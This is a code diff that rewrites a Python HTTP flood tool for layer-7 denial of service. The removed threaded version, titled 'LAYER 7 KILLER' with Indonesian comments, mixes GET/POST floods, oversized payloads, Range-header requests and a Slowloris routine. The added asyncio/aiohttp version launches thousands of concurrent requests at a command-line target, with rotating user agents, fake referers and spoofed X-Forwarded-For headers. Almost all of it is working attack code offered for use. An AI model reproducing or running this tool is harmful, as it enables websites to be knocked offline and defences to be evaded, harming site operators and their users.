@@ -1,105 +1,99 @@
-#!/usr/bin/env python3
-# LAYER 7 KILLER - Single Method HTTP Flood Extreme
-
-import requests
-import threading
+import asyncio
+import aiohttp
 import random
-import time
 import sys
-import ssl
-from urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+import time
+from collections import defaultdict
 
-# Konfigurasi
-target_url = sys.argv[1] if len(sys.argv) > 1 else input("URL Target (http://example.com): ")
-threads = int(sys.argv[2]) if len(sys.argv) > 2 else 500
+if len(sys.argv) < 2:
+    print("Usage: python l7asynckill.py <target_url> [connections] [duration]")
+    sys.exit(1)
+
+target = sys.argv[1]
+connections = int(sys.argv[2]) if len(sys.argv) > 2 else 2000
 duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
 
-end_time = time.time() + duration
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1"
+]
 
-# Payload besar untuk membebani server
-large_payload = "POST / HTTP/1.1\r\n" + \
-                "Host: {}\r\n".format(target_url.replace("http://","").replace("https://","").split("/")[0]) + \
-                "User-Agent: {}\r\n" + \
-                "Content-Type: application/x-www-form-urlencoded\r\n" + \
-                "Content-Length: 10000\r\n\r\n" + \
-                "x=" + "A"*9000
+referers = [
+    "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com",
+    "https://facebook.com", "https://twitter.com", "https://instagram.com", "https://youtube.com",
+    "https://reddit.com", "https://linkedin.com", "https://tiktok.com", "https://snapchat.com"
+]
 
-# Headers acak
-def random_headers():
-    return {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-        ]),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+request_count = 0
+error_count = 0
+
+async def flood(session, url):
+    global request_count, error_count
+    headers = {
+        'User-Agent': random.choice(user_agents),
+        'Referer': random.choice(referers),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Connection': 'keep-alive',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
     }
-
-# Slowloris trick: keep connection open
-def slowloris_attack():
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(4)
-        host = target_url.replace("http://","").replace("https://","").split("/")[0]
-        port = 443 if "https" in target_url else 80
-        sock.connect((host, port))
-        if port == 443:
-            sock = ssl.wrap_socket(sock)
-        sock.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
-        while time.time() < end_time:
-            sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
-            time.sleep(random.uniform(0.5, 2))
-        sock.close()
+        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+            await resp.read()
+            request_count += 1
     except:
-        pass
+        error_count += 1
 
-# HTTP flood with large POST
-def http_flood():
-    session = requests.Session()
-    while time.time() < end_time:
-        try:
-            headers = random_headers()
-            # Metode 1: GET dengan random query string
-            url_random = target_url + "?" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890", k=random.randint(10,50)))
-            session.get(url_random, headers=headers, timeout=3, verify=False)
-            
-            # Metode 2: POST dengan payload besar
-            session.post(target_url, headers=headers, data={"data": "A"*5000}, timeout=3, verify=False)
-            
-            # Metode 3: Request dengan range header (membebani CPU)
-            headers["Range"] = "bytes=0-"
-            session.get(target_url, headers=headers, timeout=3, verify=False)
-        except:
-            pass
+async def worker(session, url, stop_event):
+    while not stop_event.is_set():
+        await flood(session, url)
+        await asyncio.sleep(0)  # memberi kesempatan event loop untuk task lain
 
-# Multi-thread eksekusi
-print(f"[+] LAYER 7 KILLER ACTIVE")
-print(f"[+] Target: {target_url}")
-print(f"[+] Threads: {threads}")
-print(f"[+] Duration: {duration} detik")
-print("[+] Menyerang...")
+async def main():
+    global request_count
+    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        stop_event = asyncio.Event()
+        tasks = []
+        for _ in range(connections):
+            tasks.append(asyncio.create_task(worker(session, target, stop_event)))
+        
+        start = time.time()
+        end = start + duration
+        
+        # Monitor thread untuk print statistik setiap 2 detik
+        def monitor():
+            last_count = 0
+            while time.time() < end:
+                time.sleep(2)
+                now = time.time()
+                elapsed = now - start
+                total = request_count
+                rps = (total - last_count) / 2
+                last_count = total
+                print(f"[{elapsed:.0f}s] Total: {total} | RPS: {rps:.0f} | Errors: {error_count}")
+        import threading
+        monitor_thread = threading.Thread(target=monitor, daemon=True)
+        monitor_thread.start()
+        
+        await asyncio.sleep(duration)
+        stop_event.set()
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        elapsed = time.time() - start
+        print(f"\nFinished. Total requests: {request_count} | Time: {elapsed:.2f}s | Avg RPS: {request_count/elapsed:.0f}")
 
-# Jalankan semua thread
-for _ in range(threads):
-    t = threading.Thread(target=http_flood)
-    t.daemon = True
-    t.start()
-    # Tambahkan slowloris thread juga
-    if _ % 10 == 0:
-        t2 = threading.Thread(target=slowloris_attack)
-        t2.daemon = True
-        t2.start()
-
-# Tunggu sampai durasi habis
-time.sleep(duration)
-print("[+] Selesai")
+if __name__ == "__main__":
+    print(f"Target: {target}")
+    print(f"Concurrent connections: {connections}")
+    print(f"Duration: {duration} seconds")
+    print("Launching async L7 flood...")
+    asyncio.run(main())
